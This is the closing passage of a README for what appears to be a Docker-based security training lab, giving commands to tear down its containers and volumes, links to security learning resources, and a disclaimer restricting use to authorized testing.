# Remove all data
docker compose down -v

# Remove images
docker compose down -v --rmi all
```

---

## 📚 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [SQLmap Documentation](https://sqlmap.org/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)

---

## ⚠️ Disclaimer

This project is for **educational purposes only**. The authors are not responsible for any misuse of this software. Only use in authorized testing environments. Unauthorized access to computer systems is illegal and punishable by law.
